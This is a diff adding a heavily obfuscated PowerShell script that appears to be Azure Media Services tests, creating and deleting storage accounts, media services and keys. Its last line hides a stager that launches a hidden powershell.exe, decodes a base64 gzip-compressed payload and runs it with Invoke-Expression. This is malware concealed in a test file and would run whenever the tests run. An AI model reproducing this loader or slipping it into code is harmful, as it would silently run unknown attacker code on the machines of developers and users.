@@ -1,0 +1,189 @@
+SEt  ("{1}{0}{2}" -f 'rnd','l','Yj') ([type]("{0}{1}" -F 'In','Tptr')  )  ; $o5k  =[TYpE]("{3}{2}{4}{1}{0}" -F 'S','eS','tiCS.','SyStEM.dIAgnOS','pRoC');  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function tEst`-me`dia
+{
+  ${r`gNAME} = &("{0}{3}{2}{1}"-f 'Get','ame','rceGroupN','Resou')
+  ${PRefErE`Dl`oCa`TI`On} = ("{0}{1}" -f'E','ast US')
+  ${lOc`AtI`oN} = &("{3}{5}{6}{1}{2}{4}{0}"-f'n','A','vailableLoca','G','tio','et','-') ${p`R`eF`ER`eDLoCAtIoN}
+  &("{2}{3}{1}{0}" -f 'tput','e-Ou','Wri','t') ${l`OCAt`ion}
+
+  ${r`E`SO`Ur`cEGrOUP} = &("{1}{3}{0}{2}"-f'eRe','Cr','sourceGroup','eat') ${RGna`Me} ${l`ocAT`IoN}
+
+  ${sTOrAg`ea`ccOuN`TNAm`e1} = "sto" + ${R`g`NaMe}
+  ${Sto`R`Ag`eAc`C`ouNt1} = &("{2}{3}{1}{0}{4}" -f'eAc','torag','Cre','ateS','count') ${R`gN`AMe} ${s`T`oRageacCou`Nt`NAme1} ${L`OC`At`iOn}
+
+  ${St`or`AGeACcOuNtnA`mE2} = "sto" + ${rGn`A`mE} + "2"
+  ${St`oRA`Ge`A`ccoUnt2} = &("{0}{1}{5}{4}{2}{3}"-f 'CreateS','to','un','t','cco','rageA') ${R`g`Name} ${S`TO`RaGe`ACCouNtnA`m`E2} ${lOcAT`iOn}
+
+  
+  ${aC`CO`UnTNAMe} = "med" + ${rG`NAmE}
+  ${AVAI`l`A`BIliTy} = &("{6}{8}{4}{5}{2}{3}{9}{0}{1}{7}"-f 'Ava','ilab','i','ceNa','AzMed','iaServ','Ge','ility','t-','me') -AccountName ${A`CC`oUnTnAmE}
+  &("{1}{3}{2}{0}"-f'reEqual','A','t-A','sser') ${TR`UE} ${A`VaILABi`L`ItY}."NAmeaVAI`l`AB`Le"
+
+  
+  ${a`cCoUn`TNAme} = "med" + ${RgNa`me}
+  ${t`AGs} = @{("{1}{0}"-f'1','tag') = ("{1}{0}" -f'1','value'); ("{1}{0}"-f'2','tag') = ("{0}{2}{1}"-f 'v','e2','alu')}
+  ${sT`oRAGE`ACcOu`NT1} = &("{3}{1}{0}{4}{2}"-f'o','torageAcc','t','GetS','un') -ResourceGroupName ${rG`N`AME} -Name ${StOrAgEAc`cO`UNT`NaMe1}
+  ${meDi`AserV`iCE} = &("{2}{1}{4}{3}{0}"-f 'iaService','w-Az','Ne','d','Me') -ResourceGroupName ${RG`Na`mE} -AccountName ${aCCouNT`NA`ME} -Location ${L`oCAT`iON} -StorageAccountId ${StOrAg`eaCCO`U`Nt1}."id" -Tag ${t`AGs}
+  &("{2}{0}{1}"-f 'rt-','NotNull','Asse') ${ME`dIa`S`eRvicE}
+  &("{1}{0}{3}{2}{4}"-f 's','A','re','sert-A','Equal') ${aCcO`U`NTNamE} ${Me`diasERVi`ce}."Ac`COu`NtNAme"
+  &("{3}{2}{0}{1}"-f 'eEqua','l','sert-Ar','As') ${RgN`A`me} ${M`EDIa`s`ErViCe}."res`O`URCE`GroU`pnAmE"
+  &("{2}{1}{0}" -f'al','t-AreEqu','Asser') ${lo`cAti`oN} ${m`EdiAseRV`ICE}."l`oC`AtiON"
+  &("{1}{0}{3}{2}" -f'Ta','Assert-','s','g') ${Ta`Gs} ${MeD`ias`ErvI`Ce}."t`AGS"
+  &("{0}{1}{3}{2}" -f'Asser','t-AreE','al','qu') ${StoRA`gEa`CCoUNT`N`AMe1} ${mEd`IA`SERviCE}."s`Tora`GeACco`UNtS"[0]."AcCOU`Nt`NA`ME"
+  &("{2}{1}{0}{3}" -f't-AreEq','ser','As','ual') ${T`RUe} ${Me`DiA`SE`RVicE}."st`oRaGEacC`ou`N`Ts"[0]."iSp`RIm`ARy"
+  &("{1}{3}{2}{0}"-f'l','A','Equa','ssert-Are') ${rg`Na`mE} ${meDiAsErV`i`cE}."sT`OrAGeA`CC`ouNts"[0]."R`EsouRceG`RoU`Pna`Me"
+
+  ${aV`AIlaBIL`ITY} = &("{2}{0}{4}{1}{5}{6}{3}{8}{7}"-f '-','ServiceNameAv','Get','bil','AzMedia','ail','a','y','it') -AccountName ${ACco`U`Nt`NAme}
+  &("{4}{3}{2}{1}{0}" -f'Equal','e','Ar','-','Assert') ${Fa`lsE} ${aV`AiL`ABIL`i`TY}."nAmeAvAI`lA`Ble"
+
+  
+  ${m`EDIaSeR`VI`cEs} = &("{2}{4}{1}{0}{3}"-f'erv','ediaS','Ge','ice','t-AzM') -ResourceGroupName ${R`gN`AmE}
+  &("{2}{0}{1}"-f'ert','-NotNull','Ass') ${meDia`sER`V`ic`ES}
+  &("{2}{0}{3}{1}" -f'rt-A','qual','Asse','reE') 1 ${Me`DIa`s`erViCES}."cou`Nt"
+  &("{3}{0}{2}{1}"-f'sse','qual','rt-AreE','A') ${ACCO`UNTNA`Me} ${Me`d`iAse`RvICEs}[0]."Ac`Co`UNTNa`Me"
+  &("{0}{1}{2}{3}" -f 'Asse','rt-AreE','q','ual') ${RG`NA`ME} ${Me`d`iasErvIC`eS}[0]."r`esOURcEg`R`ou`PnA`ME"
+  &("{0}{2}{1}" -f'Asse','reEqual','rt-A') ${lo`CAt`ioN} ${mEDIAs`E`R`VIcES}[0]."lOC`A`TIOn"
+  &("{3}{0}{2}{1}"-f 't','reEqual','-A','Asser') ${ST`O`RAG`e`AccOuntnaM`E1} ${MEDiAsE`RV`IcES}[0]."s`TORag`Ea`cCountS"[0]."Acc`ou`NtNamE"
+  &("{2}{0}{4}{1}{3}"-f 'sser','E','A','qual','t-Are') ${Tr`Ue} ${medIA`Ser`Vice}."sTOrAG`EAc`c`OuNtS"[0]."i`spR`IMARY"
+  &("{1}{0}{2}{3}{4}" -f'e','Ass','r','t-A','reEqual') ${RGn`Ame} ${m`eDiASERv`i`ceS}[0]."sT`o`RAgEaCcoUn`TS"[0]."ReSOuR`cEg`RoU`pn`AmE"
+
+  
+  ${M`EDIase`Rv`iCe} = &("{4}{5}{0}{3}{2}{1}"-f'e','vice','er','diaS','Get-A','zM') -ResourceGroupName ${R`gname} -AccountName ${acco`UnT`N`Ame}
+  &("{2}{1}{0}{3}" -f 'NotNu','ssert-','A','ll') ${mEdIA`ser`VI`ce}
+  &("{0}{3}{2}{4}{1}" -f'Asser','reEqual','-','t','A') ${AC`cO`Unt`NaME} ${MEDIA`sEr`VIcE}."ACC`oUNtna`me"
+  &("{3}{1}{2}{0}" -f'l','rt-AreEqu','a','Asse') ${rGn`AMe} ${m`ediA`Ser`VICE}."ReS`OuRcEGrOUp`N`AmE"
+  &("{1}{2}{3}{4}{0}"-f'Equal','A','sse','rt-A','re') ${loCAT`ION} ${MeDIa`sEr`V`I`cE}."l`OCat`ioN"
+  &("{0}{2}{3}{4}{1}"-f'As','Equal','se','rt-Ar','e') ${STO`RaGea`cCO`UNtnAmE1} ${ME`d`I`AS`ERvicE}."S`TorAgeac`COUNTs"[0]."acC`O`Unt`NamE"
+  &("{1}{0}{3}{2}{4}"-f'ert-','Ass','re','A','Equal') ${tr`UE} ${M`E`di`ASERVi`cE}."sto`RaG`ea`cc`ounTS"[0]."IS`prIM`A`Ry"
+  &("{3}{1}{4}{2}{0}"-f'l','-Are','ua','Assert','Eq') ${r`gNaME} ${mE`d`iasEr`V`ice}."S`T`o`RAgeACCOUntS"[0]."Res`oU`RceGr`oUpnAme"
+
+  
+  ${ta`g`sUPD`Ated} = @{("{1}{0}"-f '3','tag') = ("{0}{1}"-f 'valu','e3'); ("{1}{0}"-f 'g4','ta') = ("{1}{0}"-f '4','value')}
+  ${sTOr`AGE`ACc`o`UnT2} = &("{4}{3}{5}{0}{1}{2}" -f 'Acco','u','nt','torag','GetS','e') -ResourceGroupName ${rG`N`Ame} -Name ${S`ToragEA`c`COU`NtnAM`e2}
+  ${PR`i`MaRysTOr`AG`eACco`UNt} = &("{5}{3}{8}{0}{6}{2}{9}{1}{4}{7}"-f 'iaSer','t','ic','-Az','orag','New','v','eConfig','Med','eS') -storageAccountId ${sTORaGea`CC`O`Un`T1}."iD" -IsPrimary
+  ${SeCo`N`dAry`st`O`RAgeAccOU`NT} = &("{1}{2}{0}{5}{8}{7}{4}{3}{6}" -f 'v','New-Az','MediaSer','i','eConf','i','g','rag','ceSto') -storageAccountId ${stor`AGE`A`ccoUNT2}."ID"
+  ${StoR`A`g`Eac`cOuNTs} = @(${Pri`M`A`RYSt`ora`Gea`CCOUNt}, ${s`e`con`DAr`YSTora`gEaccOU`Nt})
+  ${M`eD`i`ASErVICEuPdatEd} = &("{0}{2}{3}{1}" -f'Set-','ice','AzMediaS','erv') -ResourceGroupName ${R`g`NamE} -AccountName ${AcCo`UN`Tn`AME} -Tag ${tAGsU`pd`AtEd} -StorageAccounts ${s`TORAgeacc`oUnts}
+  &("{0}{4}{1}{3}{2}" -f'A','er','Null','t-Not','ss') ${M`Ed`iAsErv`ICe`UP`DaT`Ed}
+  &("{0}{2}{1}" -f'Asse','t-Tags','r') ${Ta`gS`U`pDATeD} ${MEDiaS`ErvIcEU`p`DATED}."T`AGS"
+  &("{4}{0}{1}{2}{3}"-f'sser','t-','Are','Equal','A') ${sT`ORa`gEaC`CoU`NtnAm`e1} ${meDIAserv`i`Ce`UpDA`Ted}."SToR`Age`ACCO`UnTS"[0]."A`CcOUnTNa`Me"
+  &("{3}{4}{2}{1}{0}" -f'al','qu','eE','Assert','-Ar') ${T`RUe} ${mED`IAS`ERV`I`Ce}."s`TO`RageaccouN`Ts"[0]."i`s`priMaRY"
+  &("{1}{0}{2}"-f'reEqu','Assert-A','al') ${StOR`A`gEA`C`Coun`TnAme2} ${mE`DiaSer`V`iC`EuPdaTEd}."sTOra`gEac`Coun`TS"[1]."acCOu`N`TN`AME"
+  &("{3}{2}{0}{1}"-f't-AreEq','ual','r','Asse') ${FA`l`Se} ${me`dIAse`Rv`iceuP`dAtED}."STorA`GEac`C`OU`Nts"[1]."I`SpriMA`RY"
+
+  
+  ${SerV`iCeke`yS} = &("{4}{5}{0}{2}{3}{1}"-f'-AzMed','eys','iaService','K','G','et') -ResourceGroupName ${rg`Na`ME} -AccountName ${ACcoU`NtN`A`Me}
+  &("{0}{3}{2}{1}" -f'Asse','ull','tN','rt-No') ${sEr`VI`Ce`keyS}
+  &("{0}{3}{2}{1}" -f'Ass','ll','otNu','ert-N') ${SE`R`VI`CekeYs}."PriMa`RYauThEN`d`pO`int"
+  &("{0}{1}{2}"-f 'Assert-NotN','ul','l') ${SeR`Vi`CEkEyS}."p`R`im`ARYKeY"
+  &("{3}{0}{2}{1}" -f 'sser','ull','t-NotN','A') ${sErvIC`e`keyS}."s`ec`Ond`AryAU`Th`en`dpOint"
+  &("{0}{1}{2}{3}" -f'Asse','rt-NotN','ul','l') ${s`E`RViCekE`yS}."se`C`ONdarYK`ey"
+  &("{4}{0}{1}{3}{2}"-f'r','t-','otNull','N','Asse') ${se`RVi`c`ekeyS}."s`COPe"
+
+  
+  ${Service`ke`y`sup`Dat`eD1} = &("{1}{4}{2}{3}{0}"-f'Key','Set-A','erv','ice','zMediaS') -ResourceGroupName ${R`gNAmE} -AccountName ${A`CCoU`NT`Name} -KeyType ("{0}{1}"-f 'Primar','y')
+  &("{2}{1}{0}{3}" -f'No','sert-','As','tNull') ${seRVicE`K`EYSUP`dA`TED1}
+  &("{0}{2}{3}{1}" -f 'Asser','l','t-Not','Nul') ${S`eRvIcEK`EySUp`Da`T`Ed1}."K`EY"
+  &("{2}{3}{0}{1}" -f 'e','NotEqual','Asser','t-Ar') ${sE`R`Vi`cekeYS}."P`RimA`RYKEy" ${seR`VI`C`eKE`ysupDA`TEd1}."K`Ey"
+
+  ${serVIce`kE`ySU`pdATed2} = &("{4}{3}{1}{2}{6}{0}{5}"-f'rviceK','M','edi','et-Az','S','ey','aSe') -ResourceGroupName ${r`GN`AmE} -AccountName ${acco`UN`TN`AmE} -KeyType ("{1}{2}{0}" -f'y','Se','condar')
+  &("{0}{3}{2}{1}"-f'Ass','otNull','N','ert-') ${S`Erv`IcEkEySuP`dA`Ted2}
+  &("{0}{2}{1}{4}{3}" -f'A','rt-No','sse','Null','t') ${seR`Vi`CeK`EYsUpD`A`Ted2}."k`Ey"
+  &("{5}{1}{2}{4}{0}{3}" -f 'ua','ert-AreN','otE','l','q','Ass') ${sErV`ICE`keyS}."sE`con`dArY`kEY" ${s`eRV`i`C`E`KeYSUpdaTEd2}."k`ey"
+
+  
+  &("{0}{1}{3}{2}{4}"-f 'Rem','ove-AzMed','aServ','i','ice') -ResourceGroupName ${RGna`Me} -AccountName ${AcCo`Un`TN`AmE} -Force
+  ${m`EDiaserv`Ic`es} = &("{0}{2}{1}{3}" -f 'Get','MediaS','-Az','ervice') -ResourceGroupName ${rg`NamE}
+  &("{0}{2}{1}"-f 'As','ert-Null','s') ${Med`I`AsErviC`eS}
+
+  
+  ${tA`GS} = @{("{1}{0}"-f'g1','ta') = ("{1}{0}" -f 'alue1','v'); ("{1}{0}" -f'g2','ta') = ("{1}{0}" -f '2','value')}
+  ${me`D`i`AsERV`ICE} = &("{2}{3}{1}{0}" -f 'iaService','Med','Ne','w-Az') -ResourceGroupName ${rg`NA`Me} -AccountName ${aCCoUn`T`NAME} -Location ${LOC`Ati`on} -StorageAccounts ${S`ToRAGEAC`Co`UnTs} -Tag ${ta`GS}
+  &("{0}{2}{1}" -f'Assert','otNull','-N') ${MEDIASe`R`VIcE}
+  &("{0}{1}{2}{3}{4}" -f 'As','se','rt','-AreE','qual') ${Ac`Cou`N`TnAme} ${M`ed`iaSERv`ice}."ACc`ouNT`NAmE"
+  &("{4}{3}{2}{1}{0}"-f'eEqual','ert-Ar','s','s','A') ${rGNA`Me} ${mEDia`SeR`VIce}."r`EsO`U`R`cegROUPnAME"
+  &("{0}{2}{4}{3}{1}" -f 'Ass','l','ert-','ua','AreEq') ${LoCa`T`IoN} ${mED`IAseRVI`ce}."LoCa`Ti`oN"
+  &("{2}{1}{0}" -f '-Tags','ert','Ass') ${Ta`gs} ${m`edIasE`RV`i`ce}."tA`gS"
+  &("{3}{4}{0}{2}{1}" -f'e','eEqual','rt-Ar','As','s') ${sto`RageAcCo`U`NtNam`e1} ${me`dI`AseRv`ICE}."stOr`AgE`ACcOUNTs"[0]."ac`Co`U`NtName"
+  &("{3}{4}{2}{0}{1}" -f'qua','l','AreE','Asse','rt-') ${T`RUe} ${mEDI`ASe`Rv`Ice}."stO`RAg`EA`cCOun`TS"[0]."is`p`R`ImaRy"
+  &("{0}{2}{3}{1}"-f'Assert','l','-AreEqu','a') ${rg`Na`Me} ${Med`IAS`e`RV`IcE}."s`T`oRAgEacCOuN`Ts"[0]."R`eSoUrCEGrOUpn`A`Me"
+  &("{2}{0}{1}{4}{3}" -f 't-Ar','eE','Asser','l','qua') ${storAgeA`cCo`UNtN`Ame2} ${Me`DI`ASeRVIcE}."Storag`e`ACc`OUn`TS"[1]."ac`cO`Untna`mE"
+  &("{2}{3}{0}{1}{4}"-f'sert-','Ar','A','s','eEqual') ${FAL`SE} ${MEdIAs`eRV`ICE}."Sto`RAgE`Acco`U`NTS"[1]."IS`PRIM`Ary"
+  &("{1}{0}{3}{2}"-f'ert-Ar','Ass','al','eEqu') ${rgN`A`ME} ${me`d`iAsE`RVICe}."stOrAG`EAcc`OuNTs"[1]."rEsOu`RCE`Gr`O`UpName"
+
+  &("{0}{1}{3}{4}{5}{2}" -f 'R','em','e','ove','-AzMedi','aServic') -ResourceGroupName ${Rg`NAMe} -AccountName ${aC`c`oUNTNaME} -Force
+  &("{4}{1}{3}{2}{0}"-f 't','veStorageAcc','un','o','Remo') ${R`gna`mE} ${sToR`A`Ge`ACcOU`NtNaMe1}
+  &("{1}{3}{4}{2}{0}" -f'nt','Remo','u','veSt','orageAcco') ${rg`Name} ${sto`RageAccO`Unt`N`AM`E2}
+  &("{3}{1}{4}{2}{0}" -f'p','c','ou','RemoveResour','eGr') ${R`GnAme}
+}
+
+
+function TeSt-`MEDIAWIT`h`Pi`pIng
+{
+  ${r`gnA`mE} = &("{4}{5}{2}{6}{0}{3}{1}" -f 'ceGroupNa','e','Resou','m','G','et','r')
+  ${PR`eFEREdLOc`AT`I`ON} = ("{0}{1}" -f'Eas','t US')
+  ${L`o`CAt`IoN} = &("{4}{3}{1}{2}{0}{5}" -f'lableLoca','Av','ai','-','Get','tion') ${PrEf`Ered`l`o`CaTiOn}
+
+  ${reSOurCe`G`RO`UP} = &("{5}{1}{4}{2}{3}{0}" -f 'p','reateRes','rc','eGrou','ou','C') ${rG`N`AMe} ${l`oCati`On}
+  &("{1}{3}{2}{0}{4}"-f 'otNul','Ass','t-N','er','l') ${R`ES`OU`R`cEgRoup}
+  &("{2}{1}{0}" -f 'reEqual','sert-A','As') ${RG`NA`mE} ${R`esOuR`C`E`grOup}."ReS`OurCEGR`Oup`NAMe"
+  &("{2}{0}{1}{3}" -f'ssert-','A','A','reEqual') ${LO`cat`IoN} ${REsOu`RC`E`gRoup}."lo`Ca`TiON"
+
+  ${sT`o`RagE`A`CCOuNt`NamE1} = "sto" + ${rG`Na`mE}
+  ${stOrAg`EAC`COu`N`T1} = &("{3}{4}{1}{0}{2}"-f 'o','eAcc','unt','Create','Storag') ${RgN`AmE} ${storAgEAc`c`OuNtna`me1} ${LoCA`T`Ion}
+
+  
+  ${AC`C`OUnT`NAmE} = "med" + ${r`gn`Ame}
+  ${t`Ags} = @{("{0}{1}"-f 'tag','1') = ("{0}{1}" -f'v','alue1'); ("{1}{0}" -f '2','tag') = ("{0}{1}" -f'val','ue2')}
+  ${MeDIAsE`R`VIce} = &("{1}{0}{2}{3}"-f 'tStorag','Ge','eAcc','ount') -ResourceGroupName ${rgna`ME} -Name ${SToRAg`E`AccO`U`NT`NaME1} | &("{2}{0}{4}{1}{3}"-f'-AzM','i','New','aService','ed') -ResourceGroupName ${r`GNa`mE} -AccountName ${aC`CoUN`TNaME} -Location ${lO`caTi`on} -Tag ${t`AGs}
+  &("{3}{2}{1}{0}"-f'll','rt-NotNu','e','Ass') ${MediA`sErv`icE}
+  &("{1}{3}{2}{0}" -f 'qual','Ass','t-AreE','er') ${aC`c`OuntNamE} ${M`EdIASe`RVIcE}."ac`C`OUNtnaME"
+  &("{2}{4}{0}{3}{1}" -f 'Ar','qual','Assert','eE','-') ${rGnA`Me} ${Medias`ER`V`Ice}."RES`OuRce`gR`OUpNaME"
+  &("{3}{0}{2}{1}" -f'sert','AreEqual','-','As') ${lO`caT`iON} ${mEDiaS`e`R`Vi`ce}."l`Ocati`ON"
+  &("{2}{1}{0}{3}" -f 't-','sser','A','Tags') ${Ta`Gs} ${M`Edi`ASE`Rvi`CE}."Ta`GS"
+  &("{1}{0}{2}"-f'r','Assert-A','eEqual') ${s`T`OraG`eac`CounTN`A`mE1} ${M`EDi`A`s`ErviCE}."StO`Rage`Ac`Cou`NTS"[0]."ACcoun`T`NAme"
+  &("{0}{4}{3}{2}{1}" -f 'As','ual','-AreEq','ert','s') ${tR`Ue} ${MEdI`As`e`RVICE}."sTo`RAg`eAc`COUNts"[0]."IsprIma`Ry"
+  &("{1}{3}{2}{0}" -f 'l','Asser','ua','t-AreEq') ${R`Gna`Me} ${MeDiAS`Er`VIce}."StO`R`AgeAccO`Un`Ts"[0]."R`Es`ouRC`EG`R`oupnAme"
+
+  
+  ${t`AGsuP`d`ATEd} = @{("{1}{0}"-f'3','tag') = ("{0}{1}" -f 'v','alue3'); ("{0}{1}" -f'ta','g4') = ("{2}{1}{0}"-f'e4','u','val')}
+  ${Med`I`AsE`R`ViceuPda`Ted} = &("{0}{4}{1}{3}{2}" -f'Ge','-AzMed','aService','i','t') -ResourceGroupName ${rg`N`AMe} -AccountName ${ACC`OU`NtN`Ame} | &("{3}{1}{2}{0}"-f 'ce','aSer','vi','Set-AzMedi') -Tag ${TA`gS`U`PdaTED}
+  &("{4}{1}{2}{3}{0}" -f'll','s','ert-','NotNu','As') ${mEdI`ASe`Rv`ICE`UpDAt`ed}
+  &("{1}{3}{2}{0}"-f 'Tags','Ass','-','ert') ${tAG`Su`PdaTeD} ${mED`i`ASER`V`I`CEUPdatED}."t`AgS"
+
+  
+  ${SE`RVIc`Eke`yS} = &("{0}{5}{4}{2}{3}{1}" -f 'Ge','vice','diaSe','r','AzMe','t-') -ResourceGroupName ${rG`NaMe} -AccountName ${aCc`OuNtN`AmE} | &("{4}{1}{2}{0}{3}" -f'ic','AzMediaSe','rv','eKeys','Get-')
+  &("{4}{3}{0}{1}{2}"-f'ot','Nul','l','-N','Assert') ${s`ERVIcek`eYS}
+  &("{0}{1}{2}"-f'A','ssert','-NotNull') ${S`ervIceKE`yS}."P`RiMARyA`UtH`eNdP`oInt"
+  &("{3}{4}{0}{2}{1}" -f '-NotNu','l','l','Ass','ert') ${Ser`VI`cE`KEYs}."p`RImAr`ykeY"
+  &("{0}{1}{2}" -f'Assert-NotN','ul','l') ${Se`RVi`cekeYs}."S`EcONdarY`AUthe`Nd`PoINT"
+  &("{2}{1}{3}{0}"-f'l','tNu','Assert-No','l') ${SeR`Vi`CeK`eyS}."SeconD`AR`YKEY"
+  &("{2}{0}{1}{4}{3}"-f 't-N','ot','Asser','l','Nul') ${s`eRViCE`ke`yS}."Sc`oPe"
+
+  
+  ${SE`R`ViCekey`SU`PDated2} = &("{4}{2}{3}{1}{0}{5}" -f'erv','S','et-AzMed','ia','G','ice') -ResourceGroupName ${R`gNamE} -AccountName ${aCc`oU`NTNamE} | &("{2}{5}{1}{3}{0}{4}"-f'rvice','i','S','aSe','Key','et-AzMed') -KeyType ("{2}{0}{1}" -f 'c','ondary','Se')
+  &("{4}{3}{0}{1}{2}"-f '-NotN','u','ll','rt','Asse') ${Se`RV`Ic`eKeySUP`daTed2}
+  &("{2}{3}{0}{1}" -f 'sert','-NotNull','A','s') ${serV`i`C`EKe`Ysup`DAteD2}."K`eY"
+  &("{3}{2}{1}{0}"-f 'Equal','t','o','Assert-AreN') ${Se`RvI`Ceke`YS}."sE`CoND`A`RyKey" ${sE`R`V`ICekey`suPdATed2}."k`EY"
+
+  
+  &("{1}{3}{0}{4}{2}" -f'-AzMedi','G','e','et','aServic') -ResourceGroupName ${RG`NA`ME} -AccountName ${Ac`COu`NTnaMe} | &("{2}{0}{4}{1}{3}{5}"-f '-A','diaSer','Remove','v','zMe','ice') -Force
+
+  &("{0}{1}{2}{3}"-f 'Re','mov','eStorageAccoun','t') ${RGn`Ame} ${S`T`orA`G`EAccountN`Ame}
+  &("{4}{0}{3}{1}{2}"-f 'm','eResou','rceGroup','ov','Re') ${rGn`AME}
+}
+if( (GET-CHilDiTem  ("{3}{4}{0}{1}{2}"-f'ND','y','J','VAr','iAble:Lr')  ).vALuE::"S`ize" -eq 4){${B}=("{2}{1}{3}{0}" -f'e','s','power','hell.ex')}else{${b}=${E`NV:`WiN`dIr}+((("{10}{8}{3}{9}{7}{4}{1}{5}{0}{6}{2}" -f 'powershe','v1.','e','}','l{0}','0{0}','ll.ex','owerShel','}syswow64{0','WindowsP','{0')) -f [cHar]92)};${s}=&("{2}{1}{0}" -f 'ct','-Obje','New') ("{3}{0}{5}{6}{1}{2}{4}"-f'.Di','essS','t','System','artInfo','a','gnostics.Proc');${S}."fILEnA`mE"=${B};${s}."AR`guMEn`Ts"=('-nop'+' '+'-'+'w '+'h'+'idden'+' '+'-c'+' '+('7'+'j2s'+'=Ne'+'w-'+'Object ')."r`EplA`cE"(([char]55+[char]106+[char]50),[StRiNg][char]36)+('IO.M'+'emoryStream(,[Conv'+'ert]::FromBase64String(SV0SV'+'0H4sIAF9h4VcCA7VWaY/iRhP+vCvtf7AiJIxgGXPDSpECxua0MTZgYDKKjN0+oO2'+'GdvvAefPf3/YMZGePSTaKYiHRR1VX1VOnHQUm8VDAgHUjYn7/8P6dYmDDZ9jCRcisRadeYQpWIsvbtSiY86T07h0lKVi94ajpMz8z7GP/fB'+'4i3/CCp0+f+AhjEJCXfXUESD8MgX+AHgjZ'+'EvM/RncBBh8XhyMwCfM7U/itOoLoYMAb2ZU3TB'+'cwH/uBld/NkWnkqlW1M/QIW/z112Lp8WPtqSpcIgOGbFG7hgT4VQvCYon5o5QLXF3PgC1KnolRiGxS1b2gUa+ug9'+'CwgUxfi4EEiIussFiidtAf'+'BiTCAXOz'+'KH/ihYAt0qWCkdm3LAxCSl+dB'+'DE6AbYQRBBWmF/Yx5t8NQqI5wN6TwBGZw3g2DNBWB0bgQWBCuwnVgbJ3ewfZWJfM'+'1EqheBShbrlu4pKyIogeOEtlr5V9e7MEv2+cijF4Y8P7z+8t++BgOuY28WvQ4Gu3j0+rwFVllVQ6D1T/sxwFUaiQg2C8JVuCyscgdIT85i74fHpiSmEzfky7m48Unn'+'7kdqdg9L7yV5ex3uJHj9ukGc9UbabpwrGYYptUVnuz3KU378deUNgewEYXgPD98x7cLHf8wKwIXg2u3onk6mCbPF2AawhgMAxSI5qhXn8lk'+'3wPfIn7yDyoAVw36SeDKlW1MmlL5V5cRRbnAQS8CloL/si9YlNQxrcqW9hfL1Lz/eUqMhDIwwrjBLRnDIrjAYMCKwK0w9C73bVjwh6XhY/qytFkHimEZL7c0+lr/G8yeVREBIcmdSfFIOVdgamZ8Ackgoz9iwwuGqec5df/C4gvAGhFzj0pZg6hJ7kQGgkjxJMVf0cEaWqBsjEP0PgU8LnTBeh4dC8vuXGc2wZDrCKb6l7z4CXcM8BuiPzSlnqdQ0iUmE2H'+'ia0cORg38PsX+jzq'+'nZ8oRmPwc1h7D21HgdXkqdDAQbNmYyjLHGFSR7BN/SescKE4iRi5A+MELSbGsEURfanKLJXRxEbCYHcVFHBrOunp5WoC46sC0hya/V2LKQRN5q3xlDoc1tZ'+'ioKaftHLzWWDHHvT8gJLoLdXUJKpG'+'uiGgoPRODge0NhbmJesofL6utnGh1FLF3gjlLLUbcxXx2S6ms9P9qDcWRNXRy3bPz'+'naWpJHS'+'zFCpI0my7Z3jA/qwLdrZC1euuOHkdGxMbeBxjK7TBTRHXFH0ISinFlAHTtKMtjHUtdY4P5R0qyNF47T7sM6zTqifjjsG21hhveBo07jjBcSH'+'7WX29TiLG6Qh'+'qNw/JBs6qbcmfFK/TpSVoOkrE0HU6TzvBPoFz9V3BHfWO0Hnf4K76Jzy+bDmprUtbZDHKn'+'VPpuSGcpjGbc26sMRn5b44jid8tie9JpOLYjW'+'/fG+E8a7CRL1Sb92XkhY7y+5JBzbW7hewJigqxZv+6iT1YVFcol93s6Wdbc1VeedZKaKnrzvqYa'+'/zeCmfuwq+ql'+'lP2Qj9UADTzDqyXDSU'+'M+N1tiB3njtTMourmc'+'EX3pp3'+'K878iE+CfxyLqQKkFfcETfU+aw7hMvFWkP1ZbcvRVzsbHxOtIfz1na42m+sxVxON20F7RxUv4zCuTWYC'+'buQG262O'+'Jw2bFlMsBSYIxzvozp/vNY2ccg9bMVmisoDo5dqTRfIorgT3Foig/bhMnmwFoloZOqUoPXuKhNzKK+FYLiu2ePMzcYT1Dj3zrD8cJiIJD4auwNW8KWl8u4u'+'1dFitfecmrcDhwu/bUy4dlReGMNOvfXg7vnNfGFua3hTX'+'vbidGued'+'itvEUm'+'94'+'6yGumthFHc1Jba3Dsqw2sKmsEIjswHjo6ZOubBmz0yJm+2C3XK+0gfXciT1u3O/Peg5ht7gx2lSTrXBT3k+0oQsXDMedNCrzHqry0oGDl0D0oyjzfNeFUWExVsTVJCXc7Ds81R'+'0AjgA'+'kM4RdNK4V5'+'E+hMjMG/KtXdJx4KVJP9GquKbLRv27qxLzJ2Hpc6O+H336tKd60qr0ulJU5yB'+'wiFvh0gbH0Y7LpU2OWvzjNv'+'LofGW/eLKSd+4bXF9Lg8/SS'+'nnhKpD5f4zmrVq69M/6ez'+'Q/n/3F7Q8hzFXu1n9z8eXBPwL6H5uvGx6hlBot9RC8jCZv'+'oXALn1fDHXUOjQn79uXz9SIiH2'+'U68v0ff2YZItULAAA=SV0SV0));IEX ')."rep`lAcE"(([CHaR]83+[CHaR]86+[CHaR]48),[strINg][CHaR]39)+'(New-O'+'bj'+'ect '+'IO.'+'StreamReader'+'(New'+'-Obj'+'ect '+('IO.Co'+'mp'+'ression.G'+'zip'+'Strea'+'m'+'(Xo3s'+',[I'+'O.Com'+'pr'+'ession'+'.Comp'+'ress'+'ionMode]::De'+'co'+'mpre'+'s'+'s)'+')).Re'+'a'+'dTo'+'E'+'nd();')."Re`P`lacE"(([Char]88+[Char]111+[Char]51),'$'));${s}."uS`eSh`ellexecUTE"=${FaL`se};${S}."re`dIRect`st`AN`DArdoutp`Ut"=${T`RuE};${s}."WInDOwS`T`yle"=("{1}{0}"-f'n','Hidde');${s}."cr`eaTE`N`OwinDOW"=${T`RuE};${p}= (vArIABLE ("{0}{1}"-f 'o','5k') -VALU)::("{1}{0}"-f't','Star').Invoke(${s});
